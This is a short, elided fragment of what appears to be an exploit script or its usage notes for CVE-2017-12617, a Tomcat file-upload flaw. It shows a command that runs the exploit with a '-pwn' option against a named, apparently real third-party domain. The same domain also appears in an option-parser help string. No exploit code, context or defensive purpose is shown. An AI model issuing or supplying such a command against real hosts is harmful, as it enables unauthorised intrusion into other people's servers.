...
./cve-2017-12617.py --url https://qahydro-digital.dovertech.co.in/ -pwn pwn
...
parse.add_option("-u", "--url", dest="U",type="string", help="http://qahydro-digital.dovertech.co.in/")
